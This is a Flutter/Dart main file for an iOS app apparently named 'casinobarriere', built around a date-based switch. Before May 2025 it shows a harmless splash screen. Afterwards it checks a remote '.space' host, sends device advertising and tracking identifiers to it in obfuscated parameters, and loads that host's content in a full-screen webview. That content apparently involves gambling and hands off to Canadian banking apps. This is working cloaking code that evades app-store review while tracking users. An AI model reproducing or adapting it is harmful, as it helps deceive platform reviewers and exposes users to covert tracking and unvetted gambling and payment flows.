import 'dart:async';
import 'dart:convert';
import 'dart:math';

import 'package:app_set_id/app_set_id.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_native_splash/flutter_native_splash.dart';

import 'package:ios_fl_n_casinobarriere_3282/pages/splash_screen.dart';

import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:http/http.dart' as http;



void main() {
  WidgetsBinding widgetsBinding = WidgetsFlutterBinding.ensureInitialized();
  FlutterNativeSplash.preserve(widgetsBinding: widgetsBinding);
  SystemChrome.setSystemUIOverlayStyle(
    const SystemUiOverlayStyle(
      statusBarColor: Colors.black,
    ),
  );

  if (isTooEarly()) {
    runApp(const MainApp());

  } else {
    runApp(const MyGApp());
  }
}

bool isTooEarly() {
  final now = DateTime.now();
  var limit = DateTime(2025, 5, 9, 6, 6);
  if (now.isBefore(limit)) {
    return true;
  }
  return false;
}

class VerifScreen extends StatefulWidget {
  const VerifScreen({super.key});

  @override
  State<VerifScreen> createState() => _VerifScreenState();
}

class _VerifScreenState extends State<VerifScreen> {

  @override
  void initState() {
    super.initState();
    initialization();
  }

  static const String APPSFLYER_KEY = "BX5RmT4UeiWBs7XFeqzzDM";
  static const String APPSFLYER_APP_ID = "6744338299";
  static const String ONESIGNAL_ID = "e41ea206-27c8-496c-9fc6-7ee4b106db28";

  static const String BASE_URL =
      "https://fabulous-honored-festivity.space/lS6PKnGq";
  static const String VERIFICATION_URL_PART = "lS6PKnGq";

  static const String PREFS_FIRST_OPEN_KEY = "FIRST_OPEN_KEY";
  static const String PREFS_SAVED_URL_KEY = "PREFS_SAVED_URL_KEY";
  static const String TIMESTAMP_USE_ID_KEY = "timestamp_user_id";

  static const String STATE_INITIAL = "INITIAL";
  static const String STATE_EMPTY = "EMPTY";
  static const String STATE_ERROR = "ERROR";

  String timestampUserId = "";
  String loadingUrl = "";
  String keyword = "INITIAL";


  String attributionNaming = STATE_INITIAL;
  String appsflyerUserId = STATE_INITIAL;
  String idfa = STATE_INITIAL;
  String idfv = STATE_INITIAL;
  String onesignalId = STATE_INITIAL;

  late final AppsflyerSdk appsflyer;

  bool localPush = false;

  Future<void> initialization() async {
    OneSignal.initialize(ONESIGNAL_ID);
    OneSignal.Notifications.addClickListener((event) async {
      localPush = true;
      String url = await loadUrl();
      String newUrl = "$url&resq=true";
      SharedPreferences prefs = await SharedPreferences.getInstance();
      String ts = prefs.getString(TIMESTAMP_USE_ID_KEY) ?? "";
      String? launchUrl = event.notification.launchUrl;
      if(launchUrl == null) {
        sendEvent('push_open_webview');
      } else {
        sendEvent('push_open_browser');
      }
      Navigator.pushAndRemoveUntil(
          context,
          MaterialPageRoute(builder: (context) => MyWApp(timestampUserId: ts, loadingUrl: newUrl)),
              (Route<dynamic> route) => false);
      return;
    });
    final TrackingStatus status =
    await AppTrackingTransparency.trackingAuthorizationStatus;
    if (status == TrackingStatus.notDetermined) {
      await AppTrackingTransparency.requestTrackingAuthorization();
    }
    await postATT();
  }

  Future<void> postATT() async {
    await getIDFV();
    initAppsflyer();
    if (!await isFirstOpen()) {
      String url = await loadUrl();
      if(url.isEmpty) {
        Navigator.pushAndRemoveUntil(
            context,
            MaterialPageRoute(builder: (context) => SplashScreen()),
                (Route<dynamic> route) => false);
      } else {
        SharedPreferences prefs = await SharedPreferences.getInstance();
        String ts = prefs.getString(TIMESTAMP_USE_ID_KEY) ?? "";
        if (localPush == false) {
          Navigator.pushAndRemoveUntil(
              context,
              MaterialPageRoute(builder: (context) => MyWApp(timestampUserId: ts, loadingUrl: url)),
                  (Route<dynamic> route) => false);
        }
      }
    } else {
      saveFirstOpen();
      generateTimeStamp();
      await setUpOneSignal();
      await sendEvent("uniq_visit");
      if (await isLocationCorrect()) {
        await getIDFA();
        await getAppsflyerUserId();
        int count = 10;
        Timer.periodic(const Duration(seconds: 1), (timer) async {
          if (count < 0) {
            attributionNaming = "sssss=2";
            await formLoadingUrl();
            timer.cancel();
          } else if (attributionNaming != STATE_INITIAL) {
            await formLoadingUrl();

            timer.cancel();
          } else {
            count--;
          }
        });
      } else {
        Navigator.pushAndRemoveUntil(
            context,
            MaterialPageRoute(builder: (context) => SplashScreen()),
                (Route<dynamic> route) => false);
      }
    }
  }

  Future<void> sendEvent(String eventName) async {
    try {
      http.get(Uri.parse("$BASE_URL?dasfsa=$eventName&fasfasda=$timestampUserId"));
    } catch (e) {
    }
  }

  Future<void>  formLoadingUrl() async {
    loadingUrl =
    "$BASE_URL?$VERIFICATION_URL_PART=1&$attributionNaming&deqsfsa=$idfa&rtqsdad=$appsflyerUserId&sadweqq=$idfv&fsafsdaa=$idfv&adwerqsd=$onesignalId&fasfasda=$timestampUserId&keyword=$keyword";
    await saveUrl();
    Navigator.pushAndRemoveUntil(
        context,
        MaterialPageRoute(builder: (context) => MyWApp(timestampUserId: timestampUserId, loadingUrl: loadingUrl)),
            (Route<dynamic> route) => false);
  }

  Future<void> saveUrl() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setString(PREFS_SAVED_URL_KEY, loadingUrl);
  }

  Future<void> requestAttributionDetails() async {
    Map<String, dynamic>? data;
    String? token;
    try {
      token = await FlutterAsaAttribution.instance.attributionToken();
      data = await FlutterAsaAttribution.instance.requestAttributionDetails();
    }  on PlatformException {
      attributionNaming = "sssss=1";
      return;
    }
    bool isAsa = data?["attribution"] ?? false;
    if (isAsa) {
      attributionNaming = "swed_1=asa";
    } else {
      attributionNaming = "sssss=1";
    }

  }

  Future<void> initAppsflyer() async {
    AppsFlyerOptions options = AppsFlyerOptions(
        afDevKey: APPSFLYER_KEY, showDebug: false, appId: APPSFLYER_APP_ID);
    appsflyer = AppsflyerSdk(options);
    appsflyer.setCustomerUserId(idfv);
    appsflyer.initSdk(
        registerConversionDataCallback: true,
        registerOnAppOpenAttributionCallback: false,
        registerOnDeepLinkingCallback: false);
    appsflyer.onInstallConversionData((data) {
      getOneSignalId();
      String jsonString = jsonEncode(data);
      print(jsonString);
      if (data["status"] == "success") {
        Map payloadData = data["payload"];
        if (payloadData["af_status"] == "Organic") {
          requestAttributionDetails();
        } else {
          try {
            String newKeys = payloadData["af_keywords"];
            keyword = newKeys.replaceAll(" ", "").replaceAll(":", "").replaceAll("?", "").replaceAll("/", "");
          } catch (e) {
            keyword = "EMPTY";
          }
          attributionNaming = convertSubs(payloadData["campaign"]);
        }
      } else {
      }
    });
  }

  Future<void> getIDFA() async {
    try {
      String? data = await AppTrackingTransparency.getAdvertisingIdentifier();
      if (data.isEmpty) {
        idfa = STATE_EMPTY;
      } else {
        idfa = data;
      }
    } on PlatformException {
      idfa = STATE_ERROR;
    }
  }

  Future<void> getIDFV() async {
    try {
      String? data = await AppSetId().getIdentifier();
      if (data == null) {
        idfv = STATE_EMPTY;
      } else {
        idfv = data;
      }
    } on PlatformException {
      idfv = STATE_ERROR;
    }
  }

  String convertSubs(String inputSubs) {
    if (inputSubs.contains("_") == false) {
      return "sssss=1";
    }
    List<String> subList = inputSubs.split("_");
    String outputSubs = "";
    for (int i = 0; i < subList.length; i++) {
      outputSubs += "swed_${i + 1}=${subList[i]}";
      if (i < subList.length - 1) {
        outputSubs += "&";
      }
    }
    return outputSubs;
  }

  Future<void> getAppsflyerUserId() async {
    appsflyerUserId = await appsflyer.getAppsFlyerUID() ?? STATE_ERROR;
  }

  Future<bool> isLocationCorrect() async {
    try {
      http.Response response =
      await http.get(Uri.parse("$BASE_URL"));
      return response.statusCode == 200;
    } catch (e) {
      return false;
    }
  }

  Future<void> saveFirstOpen() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setBool(PREFS_FIRST_OPEN_KEY, false);
  }

  Future<bool> isFirstOpen() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    return prefs.getBool(PREFS_FIRST_OPEN_KEY) ?? true;
  }

  Future<String> loadUrl() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    return prefs.getString(PREFS_SAVED_URL_KEY) ?? "";

  }

  Future<void> generateTimeStamp() async {
    int timeStamp = DateTime.now().millisecondsSinceEpoch;
    int userRandomId = 1000000 + Random().nextInt(9000000);
    timestampUserId = "$timeStamp-$userRandomId";
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setString(TIMESTAMP_USE_ID_KEY, timestampUserId);
  }

  Future<void> setUpOneSignal() async {
    OneSignal.User.addTagWithKey(TIMESTAMP_USE_ID_KEY, timestampUserId);
  }

  Future<void> getOneSignalId() async {
    String? id = await OneSignal.User.getOnesignalId();
    onesignalId = id ?? STATE_EMPTY;
  }

  @override
  Widget build(BuildContext context) {
    var width = MediaQuery.of(context).size.width;
    return Scaffold(
      body: Container(
        height: double.infinity,
        width: double.infinity,
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: SafeArea(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Expanded(child: Container()),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class MyGApp extends StatefulWidget {
  const MyGApp({super.key});

  @override
  State<MyGApp> createState() => _MyGAppState();
}

class _MyGAppState extends State<MyGApp> {


  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        textTheme: const TextTheme(
          bodyLarge: TextStyle(color: Colors.white),
          bodyMedium: TextStyle(color: Colors.white),
          bodySmall: TextStyle(color: Colors.white),
          displayLarge: TextStyle(color: Colors.white),
          displayMedium: TextStyle(color: Colors.white),
          displaySmall: TextStyle(color: Colors.white),
          headlineLarge: TextStyle(color: Colors.white),
          headlineMedium: TextStyle(color: Colors.white),
          headlineSmall: TextStyle(color: Colors.white),
          titleLarge: TextStyle(color: Colors.white),
          titleMedium: TextStyle(color: Colors.white),
          titleSmall: TextStyle(color: Colors.white),
          labelLarge: TextStyle(color: Colors.white),
          labelMedium: TextStyle(color: Colors.white),
          labelSmall: TextStyle(color: Colors.white),
        ),
      ),
      home: VerifScreen(),
    );
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {

    return MaterialApp(
      home: const SplashScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}


class MyWApp extends StatefulWidget {
  final String timestampUserId;
  final String loadingUrl;

  const MyWApp({
    super.key,
    required this.timestampUserId,
    required this.loadingUrl,
  });


  @override
  State<MyWApp> createState() => _MyWAppState();
}

class _MyWAppState extends State<MyWApp> {
  final GlobalKey key = GlobalKey();

  late final InAppWebViewController webViewController;

  static const String BASE_URL =
      "https://fabulous-honored-festivity.space/lS6PKnGq";



  void loadUrl(String url) {
    webViewController.loadUrl(
        urlRequest: URLRequest(url: WebUri.uri(Uri.parse(url))));
    sendEvent("webview_open");

    OneSignal.Notifications.addPermissionObserver((state) {
      sendEvent("push_subscribe");
    });
    OneSignal.Notifications.requestPermission(true);
    Future.delayed(const Duration(seconds: 2), () {
      FlutterNativeSplash.remove();
    });
  }

  Future<void> sendEvent(String eventName) async {
    try {
      http.get(Uri.parse("$BASE_URL?dasfsa=$eventName&fasfasda=${widget.timestampUserId}"));
    } catch (e) {
    }
  }

  List<String> banksList = [
    "scotiabank",
    "bmoolbb",
    "cibcbanking",
    "conexus",
    "rbcmobile",
    "pcfbanking",
    "tdct",
  ];

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
        onWillPop: () async {
          final controller = webViewController;
          if (await controller.canGoBack()) {
            controller.goBack();
            return false;
          }
          return true;
        },
        child: SafeArea(
          maintainBottomViewPadding: true,
          bottom: false,
          child: Scaffold(
              appBar: AppBar(
                toolbarHeight: 0,
              ),
              resizeToAvoidBottomInset: false,
              backgroundColor: Colors.transparent,
              body: Column(
                children: [
                  Expanded(
                    child: InAppWebView(
                        key: key,
                        initialSettings: InAppWebViewSettings(
                            userAgent:
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
                            mediaPlaybackRequiresUserGesture: false,
                            allowsInlineMediaPlayback: true,
                            allowsBackForwardNavigationGestures: true,
                            javaScriptCanOpenWindowsAutomatically: true,
                            supportMultipleWindows: true),
                        onCreateWindow: (controller, createWindowAction) async {
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                                builder: (context) => WindowPopup(
                                    createWindowAction: createWindowAction)),
                          );
                          return true;
                        },
                        onWebViewCreated: (controller) {
                          webViewController = controller;
                          loadUrl(widget.loadingUrl);
                        },
                        shouldOverrideUrlLoading: (controller, action) async {
                          /*  try {
                            if (action.request.url!.rawValue
                                .contains("api.paymentiq.io")) {
                              var data = action.request.headers;
                              var rawReferer = data!["Referer"];
                              referer = rawReferer.toString();
                            }
                          } catch (e) {}

                          if (referer.contains("ninecasino")) {
                            try {
                              if (referer.isNotEmpty &&
                                  referer.contains("ninecasino")) {
                                var data = action.request.headers;
                                var rawReferer = data!["Referer"];

                                if (rawReferer!.contains("api.paymentiq.io")) {
                                  controller.loadUrl(
                                      urlRequest: URLRequest(
                                          url: WebUri.uri(Uri.parse(referer))));
                                  referer = "";
                                }
                              }
                            } catch (e) {}
                          }*/
                          var url = action.request.url?.uriValue;

                          var isMailto =
                              action.request.url?.scheme.startsWith("mailto") ??
                                  false;
                          var isFb =
                              action.request.url?.scheme.startsWith("fb") ??
                                  false;
                          var isBank =
                          banksList.contains(action.request.url?.scheme);
                          if (isBank &&
                              url != null &&
                              await canLaunchUrl(url)) {
                            launchUrl(url);
                            return NavigationActionPolicy.CANCEL;
                          } else if (isBank) {
                            ScaffoldMessenger.of(context)
                                .showSnackBar(const SnackBar(
                              content: Text(
                                  "There is no such app on your device. Choose another option."),
                            ));
                            return NavigationActionPolicy.CANCEL;
                          }
                          if (isFb && url != null && await canLaunchUrl(url)) {
                            launchUrl(url);
                            return NavigationActionPolicy.CANCEL;
                          }
                          if (isMailto &&
                              url != null &&
                              await canLaunchUrl(url)) {
                            launchUrl(url);
                            return NavigationActionPolicy.CANCEL;
                          }
                          return NavigationActionPolicy.ALLOW;
                        },
                        onPermissionRequest: (controller, request) async {
                          final resources = <PermissionResourceType>[];
                          if (request.resources
                              .contains(PermissionResourceType.CAMERA)) {
                            final cameraStatus =
                            await Permission.camera.request();
                            if (!cameraStatus.isDenied) {
                              resources.add(PermissionResourceType.CAMERA);
                            }
                          }
                          if (request.resources
                              .contains(PermissionResourceType.MICROPHONE)) {
                            final cameraStatus =
                            await Permission.microphone.request();
                            if (!cameraStatus.isDenied) {
                              resources.add(PermissionResourceType.MICROPHONE);
                            }
                          }
                          return PermissionResponse(
                              resources: resources,
                              action: resources.isEmpty
                                  ? PermissionResponseAction.DENY
                                  : PermissionResponseAction.GRANT);
                        }),
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      IconButton(
                          onPressed: () async {
                            if (await webViewController.canGoBack()) {
                              webViewController.goBack();
                            }
                          },
                          icon: Icon(Icons.arrow_back_rounded, color: Colors.white,)),
                      IconButton(
                          onPressed: () {
                            webViewController.reloadFromOrigin();
                          }, icon: Icon(Icons.refresh_rounded, color: Colors.white,))
                    ],
                  )
                ],
              )),
        ));
  }
}

class WindowPopup extends StatefulWidget {
  final CreateWindowAction createWindowAction;

  const WindowPopup({Key? key, required this.createWindowAction})
      : super(key: key);

  @override
  State<WindowPopup> createState() => _WindowPopupState();
}

class _WindowPopupState extends State<WindowPopup> {
  late final InAppWebViewController webViewController2;

  List<String> banksList = [
    "scotiabank",
    "bmoolbb",
    "cibcbanking",
    "conexus",
    "rbcmobile",
    "pcfbanking",
    "tdct",
  ];

  @override
  Widget build(BuildContext context) {
    return PopScope(
      onPopInvoked: (_) async {
        final controller = webViewController2;
        if (await controller.canGoBack()) {
          controller.goBack();
        } else {
          // Navigator.pop(context);
        }
      },
      child: SafeArea(
        bottom: false,
        child: Scaffold(
          backgroundColor: Colors.transparent,
          body: SizedBox(
            width: double.maxFinite,
            child: Column(
              children: [
                Expanded(
                  child: InAppWebView(
                    windowId: widget.createWindowAction.windowId,
                    onWebViewCreated: (controller) {
                      webViewController2 = controller;
                    },
                    shouldOverrideUrlLoading: (controller, action) async {
                      var url = action.request.url?.uriValue;
                      var isFb =
                          action.request.url?.scheme.startsWith("fb") ?? false;
                      var isIntent =
                          action.request.url?.scheme.startsWith("intent") ??
                              false;
                      var isBank =
                      banksList.contains(action.request.url?.scheme);
                      if (isBank && url != null && await canLaunchUrl(url)) {
                        launchUrl(url);
                        return NavigationActionPolicy.CANCEL;
                      } else if (isBank) {
                        ScaffoldMessenger.of(context)
                            .showSnackBar(const SnackBar(
                          content: Text(
                              "There is no such app on your device. Choose another option."),
                        ));
                        return NavigationActionPolicy.CANCEL;
                      }
                      if (isFb && url != null && await canLaunchUrl(url)) {
                        launchUrl(url);
                        return NavigationActionPolicy.CANCEL;
                      } else if (isFb) {
                        return NavigationActionPolicy.CANCEL;
                      }
                      if (isIntent) {
                        var newUrl = "";
                        try {
                          var stringUri = url.toString();
                          newUrl = stringUri.replaceFirst(
                              "intent://play.google.com/store/apps/",
                              "market://");
                          List<String> parts = newUrl.split(";");
                          newUrl = parts.first;
                        } catch (e) {
                          return NavigationActionPolicy.CANCEL;
                        }
                        if (url != null &&
                            await canLaunchUrl(Uri.parse(newUrl))) {
                          launchUrl(Uri.parse(newUrl));
                          return NavigationActionPolicy.CANCEL;
                        } else {
                          return NavigationActionPolicy.CANCEL;
                        }
                      }

                      return NavigationActionPolicy.ALLOW;
                    },
                    onCreateWindow: (controller, createWindowAction) async {
                      Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => WindowPopup(
                                createWindowAction: createWindowAction)),
                      );
                      return true;
                    },
                    onCloseWindow: (controller) {
                      Navigator.pop(context);
                    },
                  ),
                ),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    IconButton(
                        onPressed: () async {
                          if (await webViewController2.canGoBack()) {
                            webViewController2.goBack();
                          } else {
                            Navigator.pop(context);
                          }
                        },
                        icon: Icon(Icons.arrow_back_rounded, color: Colors.white,)),
                    IconButton(
                        onPressed: () {
                          webViewController2.reloadFromOrigin();
                        }, icon: Icon(Icons.refresh_rounded, color: Colors.white,))
                  ],
                )
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class MainApp extends StatelessWidget {
  const MainApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        textTheme: const TextTheme(
          bodyLarge: TextStyle(color: Colors.white),
          bodyMedium: TextStyle(color: Colors.white),
          bodySmall: TextStyle(color: Colors.white),
          displayLarge: TextStyle(color: Colors.white),
          displayMedium: TextStyle(color: Colors.white),
          displaySmall: TextStyle(color: Colors.white),
          headlineLarge: TextStyle(color: Colors.white),
          headlineMedium: TextStyle(color: Colors.white),
          headlineSmall: TextStyle(color: Colors.white),
          titleLarge: TextStyle(color: Colors.white),
          titleMedium: TextStyle(color: Colors.white),
          titleSmall: TextStyle(color: Colors.white),
          labelLarge: TextStyle(color: Colors.white),
          labelMedium: TextStyle(color: Colors.white),
          labelSmall: TextStyle(color: Colors.white),
        ),
      ),
      home: SplashScreen(),
    );
  }
}
